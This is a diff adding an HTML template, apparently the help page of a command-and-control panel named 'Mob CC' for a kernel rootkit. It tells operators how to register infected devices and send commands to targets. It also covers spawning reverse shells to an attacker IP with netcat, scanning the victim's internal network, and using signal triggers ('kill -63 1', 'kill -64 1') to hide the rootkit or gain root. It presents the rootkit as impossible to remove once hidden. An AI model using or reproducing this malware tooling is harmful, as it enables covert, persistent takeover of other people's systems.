@@ -1,0 +1,38 @@
+{% extends 'base.html' %}
+
+{% block content %}
+
+<div class="p-5">
+  <h1 class="text-center">Mob CC</h1>
+</div>
+
+<div class="row">
+  <div class="col-md-7">
+    <h3>Steps:</h3>
+    <ol class="text-start">
+      <li>Add Devices using the below link. (If you are using the kernel module then this step will be automatically done by that.)</li>
+      <li>Select the added Device and start sending commands to the target system.</li>
+      <li>As you may directly get root access but incase you don't get root access then check commands to gain root privilege.</li>
+      <li>You can also spawn a new shell and transfer it to any other attacking system by giving the IP of the attacking system.</li>
+    </ol>
+
+    <h3>Note:</h3>
+    <ul class="text-start">
+      <li>Note that if you kill the reverse shell process then you have to install the kernel rootkit module again into the target system.</li>
+      <li>No one can remove the module if it's hidden.</li>
+    </ul>
+  </div>
+
+  <div class="col-md-5">
+    <h3>Help:</h3>
+    <ul class="text-start">
+      <li>To spawn a new shell from different device. eg: </br> <span style="padding: 1.7rem">Attacker side</span> | <span style="padding: 1.7rem;">Command</span><pre>'nc -lvnp &lt;port&gt;' | 'spawn &lt;Attacker_IP&gt; &lt;port&gt;'</pre></li>
+      <li>To scan the internal network from the target system. <pre>'scan'</pre></li>
+      <li>To kill the connection (reverse shell process) type. <pre>'kill -9 &lt;pid&gt;'</pre></li>
+      <li>To toggle between hide and show the kernel module. <pre>'kill -63 1'</pre></li>
+      <li>To gain root privilege in the target machine from any other attacking machine using reverse shell like above. <pre>'kill -64 1'</pre></li>
+    </ul>
+  </div>
+
+</div>
+{% endblock %}
